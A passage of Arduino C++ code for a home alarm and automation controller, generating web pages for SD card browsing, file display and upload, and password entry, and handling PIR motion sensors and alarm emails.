    G_EthernetClient.print(F("<br><input type='checkbox' name='FileDelete' value='Delete'>File Delete<br><br>"));

    G_EthernetClient.print(F("<input type='submit' formaction='/"));
    G_EthernetClient.print(G_PageNames[43]);
    G_EthernetClient.println(F("/' style='width:150px;height:30px;font-size:20px' value='File Upload'>"));
    G_EthernetClient.print(F("<br>"));
  }

  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.print(F("</tr>"));

  CheckRAM();

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));  //LHS
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table id='SDCardListTable' border=1>"));
  G_EthernetClient.print(F("<tr style=\"font-family:Courier;background-color:White;\">"));

  String l_parent_dir = p_start_folder;
  if (!G_SDCardOK) {
    ActivityWrite(EPSR(E_SD_Card_Failure_16));
    G_EthernetClient.print(F("<td>SD Card Failure</td>"));
  }
  else {
    if (l_parent_dir == "")
      l_parent_dir = "/";
    //
    //display the file if a local LAN user or if user logged in or is one of the public directories
    boolean l_SD_file_links = CheckFileAccessSecurity(l_parent_dir);
    String l_last_directory = "";
    int l_dir_count; //reset to zero within the sub procedure
    int l_file_count; //reset to zero within the sub procedure
    int l_panel_count = 0;
    while (true) {
      G_EthernetClient.println(F("<td style=\"vertical-align:top;\" align=\"left\">"));
      SDCardDirectoryBrowse(&l_parent_dir[0], l_SD_file_links, l_last_directory, l_dir_count, l_file_count);
      G_EthernetClient.println(F("</td>"));
      l_panel_count++;
      //Exit now if this is the root folder or there are no sub directories or files or if we already have four panels
      if ((p_start_folder == "/") || (l_dir_count == 0) || (l_file_count != 0) || (l_panel_count == 4)) {
        break;
      }
      //Otherwise we iterate to the last sub ddirectory/folder within this sub directory or folder.
      l_parent_dir = l_parent_dir + l_last_directory + '/';
    }
  } //SD Card OK - extract the file listing

  G_EthernetClient.println(F("</tr>"));

  G_EthernetClient.println(F("<tr><td style='background-color:sandybrown;'><b>CURRENT FOLDER:</b></td></tr>"));
  G_EthernetClient.print(F("<tr><td colspan=\"0\"><input type='text' name='FOLDER' style='font-family:Courier;font-size:20px;background-color:White;text-align:left;width:100%' "));
  G_EthernetClient.print(F("readonly value='"));
  G_EthernetClient.print(l_parent_dir);
  G_EthernetClient.print(F("'></td></tr>"));

  G_EthernetClient.println(F("<tr><td style='background-color:sandybrown;'><b>FILENAME:</b></td></tr>"));
  G_EthernetClient.print(F("<tr><td colspan=\"0\"><input type='text' id='FILENAME' name='FNAME' style='font-family:Courier;font-size:20px;background-color:White;text-align:left;width:100%' "));
  G_EthernetClient.print(F("value=''"));
  //G_EthernetClient.print(F("NULL"));
  G_EthernetClient.println(F("></td></tr>"));

  G_EthernetClient.println(F("</table>")); //RHS SDCardListTable
  G_EthernetClient.println(F("</td>"));

  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.print(F("</table>")); //form
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));
  CheckRAM();
  Pop(c_proc_num);
} //SDCardListWebPage

//----------------------------------------------------------------------------------------------

void SDCardDirectoryBrowse(const String &p_parent_dir, boolean p_file_links, String &p_last_directory, int &p_dir_count, int &p_file_count) {
  //This procedure is called iteratively to auto traverse to the latest log files.
  const byte c_proc_num = 31;
  Push(c_proc_num);
  CheckRAM();
  SPIDeviceSelect(DC_SDCardSSPin);

  const char C_FileType_Dir  = '1';
  const char C_FileType_File = '2';

  File l_SD_root = SD.open(p_parent_dir.c_str(), FILE_READ);
  if (!l_SD_root) {
    ActivityWrite(Message(M_Unable_to_Open_SD_Card_Root_19));
    SPIDeviceSelect(DC_EthernetSSPin);
    Pop(c_proc_num);
    return;
  }

  //Using arrays we output a sorted directory listing
  //We only use 13 char strings so hopefully we get no String memory fragmentation
  const String C_StringMax = EPSR(E_13_tildes_109);
  const int C_SortMax = 5;
  String l_SortList[C_SortMax];	//The sort array can be as small as one array element
  unsigned long l_FileSize[C_SortMax];
  String l_PrevMax = "";
  int l_entry_count = 2; //Add one for the heading

  //Initialise the sort arrays
  for (byte l_idx = 0; l_idx < C_SortMax; l_idx++) {
    l_SortList[l_idx] = C_StringMax; //Reserves the filename space
    l_FileSize[l_idx] = 0;
  }
  CheckRAM();

  SPIDeviceSelect(DC_EthernetSSPin);
  G_EthernetClient.print(F("<table id='FileListTable' style=\"font-family:Courier;background-color:White;text-align:left;\">"));
  G_EthernetClient.println(F("<tr><td colspan=\"2\">"));
  G_EthernetClient.println(F("<b>DIR: "));
  G_EthernetClient.print(p_parent_dir);
  G_EthernetClient.print(F("</b></td>"));
  G_EthernetClient.print(F("</tr>"));
  G_EthernetClient.println(F("<tr><td><b>ENTRY NAME</b></td><td style=\"text-align:right;\"><b>SIZE</b></td></tr>"));
  SPIDeviceSelect(DC_SDCardSSPin);

  //We extract the SD card file list multiple times outputting a small sorted subset each time
  //SPIDeviceSelect(DC_SDCardSSPin);
  String l_SD_filename = "";
  boolean l_finished = false;
  boolean l_first    = true;
  File l_SD_file;
  p_last_directory = "";
  p_dir_count = 0;
  p_file_count = 0;
  CheckRAM();
  while (true) { //iterate until complete

    //In this first section we parse all the files in the directory and extract
    //the next C_SortMax set that is immediately greater that l_PrevMax.
    l_SD_root.rewindDirectory();
    while (true) {
      l_SD_file = l_SD_root.openNextFile();
      if (!l_SD_file) {
        break;
      }
      if (l_SD_file.isDirectory())
        l_SD_filename = String(C_FileType_Dir);
      else
        l_SD_filename = String(C_FileType_File);
      //
      l_SD_filename += l_SD_file.name();
      //Serial.println(l_SD_filename);
      if ((l_SD_filename > l_PrevMax) && (l_SD_filename < l_SortList[C_SortMax - 1])) {
        boolean l_inserted = false;
        //We are in range so we have to insert
        for (byte l_idx = C_SortMax - 1; l_idx > 0; l_idx--)  {
          //discard the final record (we can get it again on the next parse)
          l_SortList[l_idx] = l_SortList[l_idx - 1];
          l_FileSize[l_idx] = l_FileSize[l_idx - 1];
          //Now see if down one record is where to insert
          if (l_SD_filename > l_SortList[l_idx - 1]) {
            l_SortList[l_idx] = l_SD_filename;
            if (l_SD_file.isDirectory())
              l_FileSize[l_idx] = 0;
            else
              l_FileSize[l_idx] = l_SD_file.size();
            //
            l_inserted = true;
            break;
          } //if
        } //for
        if (!l_inserted) {
          //insert as first item - prev 1st iten was copied to be 2nd item
          l_SortList[0] = l_SD_filename;
          if (l_SD_file.isDirectory())
            l_FileSize[0] = 0;
          else
            l_FileSize[0] = l_SD_file.size();
          //
        } //if l_inserted
      } //if skip files already processed or beyond range
      l_SD_file.close();
    } //for each SD card file
    //We now have our sorted subset of SD card files

    CheckRAM();
    //Now print the array and reset its value
    //If the last cell of the array is C_SortMax we have finished
    SPIDeviceSelect(DC_EthernetSSPin);
    for (byte l_idx = 0; l_idx < C_SortMax; l_idx++) {
      if (l_SortList[l_idx] == C_StringMax) {
        l_finished = true;
        break; //we are done
      }
      if ((l_entry_count % 20) == 0) { //rollover to new column every 20 entries
        G_EthernetClient.print(F("</table>"));
        G_EthernetClient.print(F("</td>"));
        G_EthernetClient.println(F("<td style=\"vertical-align:top;\" align=\"left\">"));
        G_EthernetClient.print(F("<table style=\"font-family:Courier;background-color:White;text-align:left;\">"));
        G_EthernetClient.println(F("<tr><td><b>ENTRY NAME</b></td><td><b>SIZE</b></td>"));
        l_entry_count++; //for this heading
      }
      l_entry_count++; //for the file entry below

      G_EthernetClient.print(F("<tr><td>"));
      if ((p_file_links) || (l_SortList[l_idx][0] == C_FileType_Dir)) { //always show links for sub directories
        //Part I - Set up the html link
        G_EthernetClient.print(F("<a href=\""));
        G_EthernetClient.print(p_parent_dir);
        G_EthernetClient.print(l_SortList[l_idx].substring(1)); //file link pagename
        if (l_SortList[l_idx][0] == C_FileType_Dir) { //Directory
          //G_EthernetClient.print(F(".DIR/\">"));
          G_EthernetClient.print(F("/\">"));
        } //submit() never applies to directories
        else { //File
          //G_EthernetClient.print(F("/\" onclick='fnamesubmit(\""));
          G_EthernetClient.print(F("\" onclick='fnamesubmit(\""));
          G_EthernetClient.print(l_SortList[l_idx].substring(1));
          G_EthernetClient.print(F("\"); return false;'>"));
        }
      }

      //Part II - output the dir/file name
      G_EthernetClient.print(l_SortList[l_idx].substring(1)); //displayed file/dir name

      if ((p_file_links) || (l_SortList[l_idx][0] == C_FileType_Dir))  {//always show links for sub directories
        //Part III - terminate the html link
        G_EthernetClient.print(F("</a>"));
      }
      G_EthernetClient.print(F("</td>"));

      // files have sizes, directories do not
      G_EthernetClient.print(F("<td style=\"text-align:right;\">"));
      if (l_SortList[l_idx][0] == C_FileType_Dir) { //DIR
        p_dir_count++;
        p_last_directory = l_SortList[l_idx].substring(1);
        G_EthernetClient.print(F("[DIR]"));
      }
      else {
        p_file_count++;
        G_EthernetClient.print(l_FileSize[l_idx], DEC);
      }
      //
      G_EthernetClient.println(F("</td></tr>"));
      l_PrevMax = l_SortList[l_idx]; //record the updated prevMax
      l_SortList[l_idx] = C_StringMax; //Reset the array
      l_FileSize[l_idx] = 0; //Reset the array
    } //Print and reset each sort array record

    l_first = false;

    //We are finished if we encountered a C_StringMax record anywhere
    if (l_finished)
      break; //DC_EthernetSSPin already selected
    //
    SPIDeviceSelect(DC_SDCardSSPin);
  } //iterate until complete

  SPIDeviceSelect(DC_SDCardSSPin); //Just in case
  l_SD_root.close();

  SPIDeviceSelect(DC_EthernetSSPin);
  G_EthernetClient.println(F("<tr><td>"));
  G_EthernetClient.println(F("Subdirectories"));
  G_EthernetClient.println(F("</td><td style=\"text-align:right;\">"));
  G_EthernetClient.println(p_dir_count);
  G_EthernetClient.println(F("</td></tr>"));
  G_EthernetClient.println(F("<tr><td>"));
  G_EthernetClient.println(F("Files"));
  G_EthernetClient.println(F("</td><td style=\"text-align:right;\">"));
  G_EthernetClient.println(p_file_count);
  G_EthernetClient.println(F("</td></tr>"));
  G_EthernetClient.print(F("</table>")); //SDFileListTable
  CheckRAM();

  Pop(c_proc_num);
} //SDCardDirectoryBrowse

//----------------------------------------------------------------------------------------

void SDFileDisplayWebPage(const String &p_filename) {
  //This proc outputs the html code to display a text (TXT) file on a web page
  //This proc is used to display log files.
  //It is also used to display example information, screen information, program codes, etc.
  const byte c_proc_num = 32;
  Push(c_proc_num);
  CheckRAM();

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_SD_FILE_DISPLAY_79));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(999, EPSR(E_SD_FILE_DISPLAY_79), St_SD_Text_File_WPE); //999 display all menu options

  //Set up DELETE file link - you must be logged in
  if (UserLoggedIn()) {
    G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F("<td><b>PAGE ACTIONS</b></td>"));
    G_EthernetClient.println(F("</tr>"));

    G_EthernetClient.print(F("<tr>"));
    G_EthernetClient.print(F("<td>"));

    G_EthernetClient.print(F("<br><a href=/DEL"));
    G_EthernetClient.print(p_filename);
    G_EthernetClient.print(F("/>DELETE</a>"));

    G_EthernetClient.print(F("</td>"));
    G_EthernetClient.print(F("</tr>"));
  }

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.print(F("</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print(F("<tr style=\"font-family:Courier;background-color:White;\">"));
  G_EthernetClient.println(F("<td align=\"left\">"));
  G_EthernetClient.print(F("<b>SD FILE DISPLAY </b>"));
  G_EthernetClient.print(p_filename);
  G_EthernetClient.println(F("<br>"));

  if (!G_SDCardOK) {
    ActivityWrite(EPSR(E_SD_Card_Failure_16));
    G_EthernetClient.print(F("SD Card Failure"));
  }
  else
    SDFileDisplaySPISE(p_filename);
  //

  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));

  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.print(F("</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body></html>"));

  CheckRAM();
  Pop(c_proc_num);
} //SDFileDisplayWebPage

//----------------------------------------------------------------------------------------

void SDFileDisplaySPISE(const String &p_filename) {
  //void SDFileDisplaySPISE(String p_filename) {
  //This procedure displays an SD card file on a web page
  //We assume it is a text file and not a binary file
  const byte c_proc_num = 33;
  Push(c_proc_num);

  SPIDeviceSelect(DC_SDCardSSPin);
  String l_filename = p_filename; //cannot be const
  File l_SD_file = SD.open(&l_filename[0], FILE_READ);
  if (!l_SD_file) {
    SPIDeviceSelect(DC_EthernetSSPin);
    G_EthernetClient.println(F("File Not Found "));
    Pop(c_proc_num);
    return;
  }

  char l_char;
  boolean l_start_of_line = true;
  CheckRAM();

  //As we read the SD file and write to the ethernet connection
  //we have to switch the SPI select pin accordingly.
  while (l_SD_file.available()) {
    //We avoid Strings which seem use excessive heap memory
    //Reading the file char-by-char does not take any longer
    //and makes special character transleation easier.
    char l_char = l_SD_file.read();
    SPIDeviceSelect(DC_EthernetSSPin);
    if ((l_char == ' ') && (l_start_of_line == true))
      G_EthernetClient.print(F("&nbsp;"));
    else {
      l_start_of_line = false;
      if (l_char == '<')
        G_EthernetClient.print(F("&lt;"));
      else if (l_char == '>')
        G_EthernetClient.print(F("&gt;"));
      else {
        G_EthernetClient.print(l_char);
        if (l_char == '\n') {
          G_EthernetClient.print(F("<br>"));
          l_start_of_line = true;
        }
      }
    }
    SPIDeviceSelect(DC_SDCardSSPin);
  }
  SPIDeviceSelect(DC_SDCardSSPin); //Just in case
  l_SD_file.close();
  SPIDeviceSelect(DC_EthernetSSPin);
  CheckRAM();
  Pop(c_proc_num);
} //SDFileDisplaySPISE

//----------------------------------------------------------------------------------------------

void FileUploadWebPage() {
  //You have to be logged in to get the file upload form
  const byte c_proc_num = 74;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  //HTMLParmDelete(E_COOKIE_232); //NULL Cookie
  InitialiseWebPage(EPSR(E_FILE_UPLOAD_287));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }

  G_EthernetClient.println(F("<td style='vertical-align:top;'>"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.println(F("<tr style='background-color:Khaki;'>"));
  G_EthernetClient.println(F("<td><b>FILE UPLOAD TO SERVER FORM</b></td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("<tr style='text-align:left'>"));
  G_EthernetClient.println(F("<td>"));
  G_EthernetClient.println(F("<label for='folder'><b>Folder:</b>"));
  G_EthernetClient.print(F("<input type='text' id='folder' name='folder' style='font-size:16px;width:250px' value='"));
  G_EthernetClient.print(HTMLParmRead(E_FOLDER_235));
  G_EthernetClient.println(F("' readonly><br>"));
  G_EthernetClient.println(F("<label for='filename'><b>Upload File:</b>"));
  G_EthernetClient.println(F("<input type='file' id='filename'  name='filename' accept='text/plain' style='background-color:White;width:550px;font-weight:bold;'>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("<tr>"));
  G_EthernetClient.println(F("<td>"));
  G_EthernetClient.println(F("<input type='submit' style='width:100px;height:40px;font-size:23px;font-weight:bold;position:relative;left:-40px' value='Upload'>"));
  G_EthernetClient.print(F("<input type='submit' formaction='/"));
  G_EthernetClient.print(G_Website);
  G_EthernetClient.println(F("/' style='width:100px;height:40px;font-size:23px;font-weight:bold;position:relative;left:40px'  value='Cancel'>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body>"));
  G_EthernetClient.println(F("</html>"));

  CheckRAM();
  Pop(c_proc_num);
} //FileUploadWebPage


//----------------------------------------------------------------------------------------

void PasswordWebPage() {
  const byte c_proc_num = 34;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  HTMLParmDelete(E_COOKIE_232);
  InitialiseWebPage(EPSR(E_INPUTPASSWORD_80)); //NULL Cookie
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InputWebPage(EPSR(E_Password_Data_Entry_81), EPSR(E_Enter_Password__82));

  CheckRAM();
  Pop(c_proc_num);
} //PasswordWebPage

//----------------------------------------------------------------------------------------------

void InputWebPage(const String &p_form, const String &p_label) {
  const byte c_proc_num = 35;
  Push(c_proc_num);
  G_EthernetClient.println(F("<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1 style='width:250px'>"));
  G_EthernetClient.println(F("<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.print(F("<td><b>"));
  G_EthernetClient.print(p_form);
  G_EthernetClient.println(F("</b></td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("<tr>"));
  G_EthernetClient.print(F("<td><b>"));
  G_EthernetClient.print(    p_label);
  G_EthernetClient.println(F("</b><br>"));
  G_EthernetClient.println(F("<input type='password' name='PASSWORD' style='width:240px;height:28px;font-size:25px' value= ''>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("<tr>"));
  G_EthernetClient.println(F("<td>"));
  G_EthernetClient.println(F("<input type='submit' style='width:100px;height:40px;font-size:23px' value='Submit'>"));
  G_EthernetClient.print(F("<input type='submit' formaction='/"));
  G_EthernetClient.print(G_Website);
  G_EthernetClient.println(F("/' style='width:100px;height:40px;font-size:23px' value='Cancel'>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</td>"));
  G_EthernetClient.println(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.println(F("</form>"));
  G_EthernetClient.println(F("</body>"));
  G_EthernetClient.println(F("</html>"));
  CheckRAM();
  Pop(c_proc_num);
} //InputWebPage


//----------------------------------------------------------------------------------------

boolean CheckLocalWebPage(int p_page_num) {
  //Used to check that a local page number is still current
  //Login only web pages such as [43] File Upload are not local web pages
  const byte c_proc_num = 109;
  Push(c_proc_num);

  boolean l_result = false; //Default
  if ((p_page_num == G_PageNames [7]) || //GD Activate
      (p_page_num == G_PageNames [8]) || //GD Operate
      (p_page_num == G_PageNames[13]) || //BR Light
      (p_page_num == G_PageNames[14]) || //BR Fan
      (p_page_num == G_PageNames[15]) || //BR Heater
      (p_page_num == G_PageNames[18]) || //Alarm Activate
      (p_page_num == G_PageNames[29]) || //Garage Open
      (p_page_num == G_PageNames[30]) || //Alarm Off
      (p_page_num == G_PageNames[32]) || //Process IP Address
      (p_page_num == G_PageNames[37]) || //Fan On
      (p_page_num == G_PageNames[38]) || //Fan Off
      (p_page_num == G_PageNames[40]) || //Alarm On
      (p_page_num == G_PageNames[41]) || //Garage Close
      (p_page_num == G_PageNames[46]))   //Memory Backup
    l_result = true;
  //
  CheckRAM();
  Pop(c_proc_num);

  return l_result;
} //CheckLocalWebPage()

//----------------------------------------------------------------------------------------

void ResetAllWebPageNumbers() {
  //Initialise our web page names using random integers
  //This is a means to save SRAM - we need only two bytes per page name.
  //The constant randomSeed gives a constant set of web page nummbers
  //This facilitates search engine indexing and URL favourities for public web pages.
  //Web pages that operate based on local LAN security are reset everyday using
  //random numbers.

  const byte c_proc_num = 36;
  Push(c_proc_num);

  randomSeed(1789653017);
  unsigned int l_page_num;
  boolean l_found;

  for (byte l_idx = 0; l_idx < DC_PageNameCount; l_idx++) {
    while (true) {
      l_page_num = random(65535) + 1; //1 to 65535 inclusive
      l_found = false;
      for (byte l_index = 0; l_index < l_idx; l_index++) {
        if (G_PageNames[l_index] == l_page_num) {
          l_found = true;
          break;
        }
      } //check for duplicates
      if (l_found == false)
        break;
      //
    } //loop until we find a unique menu page number
    G_PageNames[l_idx] = l_page_num;
  }

  //Now assign new random web page numbers to all local web pages.
  //Local LAN links are only output to local IP addresses.
  ResetLocalWebPageNumbers();

  CheckRAM();
  Pop(c_proc_num);
} //ResetAllWebPageNumbers

//----------------------------------------------------------------------------------------

void ResetLocalWebPageNumbers() {
  //The local web page only page numbers are here using a random seed.
  //Any prior knowledge of these web page numbers is of limited value because these values are reset everyday.
  //These page numbers are only ever displayed as links on web pages sent to local LAN IP addresses.
  //However we continuously randomise these web pages as an additional defense against IP address spoofing.
  const byte c_proc_num = 108;
  Push(c_proc_num);

  randomSeed(Now());
  boolean l_found;
  unsigned int l_page_num;
  for (byte l_count = 0; l_count < DC_PageNameCount; l_count++) {
    if (CheckLocalWebPage(l_count)) {
      //We loop until we find the next unique web page number
      while (true) {
        l_page_num = random(65535) + 1;
        l_found = false;
        for (byte l_index = 0; l_index < DC_PageNameCount; l_index++) {
          if (G_PageNames[l_index] == l_page_num) {
            l_found = true;
            break;
          }
        } //check for duplicates
        if (l_found == false)
          break;
        //
      } //loop until we find a unique menu page number
      G_PageNames[l_count] = l_page_num;
      //Write the new page numbers to the activity log and serial monitor so we can check they change every day.
      ActivityWriteXM(WebServerWebPage(l_page_num) + " = " + String(l_page_num)); //Direct write to log file bypassing the cache
    } //Select local web page
  } //Reset all local web page numbers

  ProcessCache(true); //Force log write

  CheckRAM();
  Pop(c_proc_num);
} //ResetLocalWebPageNumbers

//----------------------------------------------------------------------------------------
//SD CARD FUNCTIONALITY
//----------------------------------------------------------------------------------------

int PrintRootDirFileCountSPISE() {
  const byte c_proc_num = 37;
  Push(c_proc_num);
  SPIDeviceSelect(DC_SDCardSSPin);

  //We open l_SD_root here and use it at the foot of the setup() procedure
  //This is done to check correct SPI SS Select operations.
  //If we get it wrong the l_SD_root will not be usable to extract the root directory file count
  //If we move l_SD_root to a sub procedure we may well minimise free heap at this level
  //but overall it will be the same in the lower level.

  File l_SD_root = SD.open("/", FILE_READ);

  l_SD_root.rewindDirectory();
  int l_count = 0;
  while (true) {
    File l_SD_entry = l_SD_root.openNextFile();
    if (!l_SD_entry) {
      break;
    }
    CheckRAM();
    if (!l_SD_entry.isDirectory()) {
      l_count++;
    }
    l_SD_entry.close();
  }
  l_SD_root.close();

  SPIDeviceSelect(DC_EthernetSSPin);
  CheckRAM();
  Pop(c_proc_num);
  return l_count;
} //PrintRootDirFileCountSPISE

//----------------------------------------------------------------------------------------
//PIR FUNCTIONALITY
//----------------------------------------------------------------------------------------

void ProcessPIRInterrupts() {
  //We use G_PIREmailIntervalTimer to suppress excessive PIR alarm emails
  //- 120 seconds when the system is initialised
  //- 60 seconds when the alarm is activated
  const byte c_proc_num = 38;
  Push(c_proc_num);
  const long C_PIREmailIntervalSeconds = 60000;

  //Called from loop - we do not process PIR detections when anything else is happening
  for (byte l_pir = 0; l_pir < DC_PIRCount; l_pir++) {
    //We check individual PIRs continuously - this aids instant nightlight switching/alarm detection.
    //But once a PIR movement has been detected we use a timer to ignore the individual PIR for 10 seconds.
    if (CheckSecondsDelay(G_PIRSensorList[l_pir].DetectionTimer, C_OneSecond * 10) == true) {
      //Has an interrupt been received in the previous ten seconds?
      if (G_PIRInterruptSet[l_pir] == true) { //Process a received interrupt

        //Reset the individual timer for ten more seconds
        G_PIRSensorList[l_pir].DetectionTimer = millis(); //So we can ignore for next ten seconds

        //Initialise the PIR time and timer
        G_PIRSensorList[l_pir].LastDetectionTime  = Now(); //May be delayed up to ten seconds if timer was operating
        //Reset the interrupt flag
        G_PIRInterruptSet[l_pir] = false;

#ifdef D_2WGApp
        //When any PIR interrupt fires we flash the RGB LED in the hallway as a signal
        //A 2nd PIR interrupt signal (from a different PIR) may overlay the LED light signal
        //Lounge (1) is red, Hallway (2) is green, Bathroom (5) is blue
        PIRRGBLEDFlash(l_pir);
#endif

        //Reset the general PIR LED timer for another 30 secs
        //This is a separate red LED on the system board
        G_PIRLEDTimer = millis();
        digitalWrite(DC_PIRLedPin, HIGH);
        CheckRAM();

        if ((G_PremisesAlarmActive == true) &&
#ifdef D_2WGApp
            ((l_pir == DC_LoungePIRInterrupt1_3) ||
             (l_pir == DC_HallwayPIRInterrupt2_21) ||
             (l_pir == DC_BathroomPIRInterrupt5_18))) {
#else
            (l_pir == DC_OfficePIRInterrupt0_2)) {
#endif
          //We have found an alarm condition
          if (CheckSecondsDelay(G_PIREmailIntervalTimer, C_PIREmailIntervalSeconds) == false) { //Normally 60 seconds, 120 at startup
            Pop(c_proc_num);
            return;
          }
          //Reset the email timer so we don't send another email for 30 seconds
          G_PIREmailIntervalTimer = millis();
          //Now send the PIR Alarm Email
          //The success or failure or the email is automatically written to the activity log
          EmailInitialise(EPSR(E_ALARM_PIR_ALERT_159));
          EmailLine(EPSR(E_PIR_Sensorco__156) + GetPIRName(l_pir));
          EmailLine(EPSR(E_Dateco__137)       + DateToString(G_PIRSensorList[l_pir].LastDetectionTime));
          EmailLine(EPSR(E_tbTimeco__158)     + TimeToHHMMSS(G_PIRSensorList[l_pir].LastDetectionTime)); //Remove tab from this EEPROM constant
          EmailDisconnect();
        }
#ifdef D_2WGApp
        else if (l_pir == DC_HallwayPIRInterrupt2_21) {
          //Premises Alarm Not Active - perform nighlight switching
          //The light may already be on - we reset for another period if it is dark
          if (analogRead(GC_LightPin) < GC_LowLightLevel) {
            if (G_LEDNightLightTimer < millis())
              G_LEDNightLightTimer = millis(); //Reset if zero or less than current.
            //
          } //Nightlight processing
        } //Process alarm or non alarm PIR scenario
        else if (l_pir == DC_BathroomPIRInterrupt5_18) {
          //Premises Alarm Not Active - perform bathroom light switching
          //The light may already be on - we reset for another period if it is dark
          if (analogRead(GC_LightPin) < GC_LowLightLevel) {
            if (G_BathroomLightTimer < millis()) {
              digitalWrite(G_BathroomLightPin, LOW); //Relay and its LED On
              G_BathroomLightTimer = millis(); //Reset if zero or less than current.
            }
          } //Bathroom light processing
        } //Process alarm or non alarm PIR scenario
#endif
      } //only process if the PIR detection/interrupt has operated
    } //skip if 10 secs has not elapsed since last PIR detection
  } //for each PIR
  CheckRAM();
  Pop(c_proc_num);
} //ProcessPIRInterrupts

//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
void BedroomPIRDetection0_2() {
  //This is an interrupt
  G_PIRInterruptSet[DC_BedroomPIRInterrupt0_2] = false; //disabled
}

//----------------------------------------------------------------------------------------

void LoungePIRDetection1_3() {
  //This is an interrupt
  //An alarm sensor (alarm on)
  G_PIRInterruptSet[DC_LoungePIRInterrupt1_3] = true;
}

//----------------------------------------------------------------------------------------

void HallwayPIRDetection2_21() {
  //This is an interrupt
  //An alarm sensor (alarm on)
  //An RGB LED light sensor switch (alarm off)
  G_PIRInterruptSet[DC_HallwayPIRInterrupt2_21] = true;
}

//----------------------------------------------------------------------------------------

void GaragePIRDetection3_20() {
  //This is an interrupt
  G_PIRInterruptSet[DC_GaragePIRInterrupt3_20] = false; //disabled
}

//----------------------------------------------------------------------------------------

void PatioPIRDetection4_19() {
  //This is an interrupt
  G_PIRInterruptSet[DC_PatioPIRInterrupt4_19] = false; //disabled
}

//----------------------------------------------------------------------------------------

void BathroomPIRDetection5_18() {
  //This is an interrupt
  G_PIRInterruptSet[DC_BathroomPIRInterrupt5_18] = true;
}

//----------------------------------------------------------------------------------------

#else
void OfficePIRDetection0_2() {
  //This is an interrupt
  G_PIRInterruptSet[DC_OfficePIRInterrupt0_2] = true; //disabled
}
#endif

//----------------------------------------------------------------------------------------
//ALARM FUNCTIONALITY
//----------------------------------------------------------------------------------------

void PremisesAlarmCheck(const String &p_activity) {
  //We call this in respect of certain email messages.
  //Generally we do not send email messages if the premises alarm is not active
  //We also suppress multiple messages - only sending new messages two minutes after the previous message.
  const byte c_proc_num = 40;
  Push(c_proc_num);
  if (!G_PremisesAlarmActive) {
    Pop(c_proc_num);
    return;
  }

  CheckSecondsDelay(G_PremisesAlarmTimer, C_OneMinute * 2);
  if (G_PremisesAlarmTimer != 0) { //let the timer run
    Pop(c_proc_num);
    return;
  }

  G_PremisesAlarmTimer = millis();
  //The success or failure or the email is automatically written to the activity log
  EmailInitialise(EPSR(E_Alarm_Alert_58));
  EmailLine(p_activity);
  EmailDisconnect();
  CheckRAM();
  Pop(c_proc_num);
} //PremisesAlarmCheck

//----------------------------------------------------------------------------------------

void ProcessAlarmTimerActions() {
  const byte c_proc_num = 41;
  Push(c_proc_num);

  //Process the pressing of the (momentary) alarm on switch near the fron door.
  if ((digitalRead(DC_AlarmSwitchPin) == HIGH) && (G_PremisesAlarmActive == false)) {
    ActivityWrite(EPSR(E_Alarm_Switched_On_34));
    G_PremisesAlarmActive = true;
  }

  if (G_PremisesAlarmActive == true) {
    //FLASH THE ALARM ON LED
    if (CheckSecondsDelay(G_AlarmOnLEDFlashTimer, C_OneSecond)) {
      if (digitalRead(DC_AlarmOnLEDPin) == HIGH) {
        digitalWrite(DC_AlarmOnLEDPin, LOW);
